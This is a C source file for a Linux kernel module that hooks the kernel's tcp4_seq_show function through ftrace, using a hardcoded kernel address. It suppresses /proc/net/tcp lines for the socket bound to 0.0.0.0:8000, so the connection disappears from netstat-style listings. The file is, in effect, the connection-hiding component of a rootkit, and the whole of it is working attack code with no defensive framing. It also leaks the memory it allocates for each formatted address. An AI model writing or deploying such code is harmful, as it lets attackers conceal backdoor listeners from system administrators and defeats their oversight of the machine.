#include <linux/module.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/ftrace.h>
#include <net/inet_sock.h>
#include <stdbool.h>

// Function prototype
void callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);

// Types & other consts.
typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
static unsigned long tcp4_seq_show_address = (unsigned long)0xffffffff9532c290; 
static original_tcp4_seq_show_t original_tcp4_seq_ptr;
static struct ftrace_ops ops = { .func = callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY};

static char *ip_to_hide = "0.0.0.0";
static int port_to_hide = 8000;
 

char * ipaddr_to_string(__be32 ipaddr)
{
    int first = (unsigned char)((ipaddr >> 24) & 0xFF);
    int second = (unsigned char)((ipaddr >> 16) & 0xFF);
    int third = (unsigned char)((ipaddr >> 8) & 0xFF);
    int fourth = (unsigned char)(ipaddr & 0xFF);

    // Maximum length of an ip string in ipv4
    char *buffer = kmalloc(15 * 8, GFP_KERNEL);
    sprintf(buffer, "%d.%d.%d.%d", first, second, third, fourth);

    return buffer;
}

int new_tcp4_seq_show(struct seq_file *seq, void *v) {
    if (v == SEQ_START_TOKEN) {
        return original_tcp4_seq_ptr(seq, v);    
    }

    struct sock *sk = v;
    const struct inet_sock *inet = inet_sk(sk);
    __be32 ipaddr = inet->inet_rcv_saddr;
    __u16 port = ntohs(inet->inet_sport);
    
    char *ipstring = ipaddr_to_string(ipaddr);
    if (!strcmp(ipstring, ip_to_hide) && port == port_to_hide) {
        printk(KERN_ALERT "Hiding %s : %u", ipstring, port);
        return 0;
    }

    return original_tcp4_seq_ptr(seq, v);
}

void notrace callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs) {
    if (!within_module(parent_ip, THIS_MODULE)) {
        regs->ip = (long unsigned int)new_tcp4_seq_show;
    }
}
 
int load(void) {
    printk(KERN_ALERT "Initializing...");
    original_tcp4_seq_ptr = (original_tcp4_seq_show_t)tcp4_seq_show_address;
    ftrace_set_filter_ip(&ops, original_tcp4_seq_ptr, 0, 0);
    register_ftrace_function(&ops);
    printk(KERN_ALERT "Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    printk(KERN_ALERT "Shutting down.");
    unregister_ftrace_function(&ops);
    printk(KERN_ALERT "Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");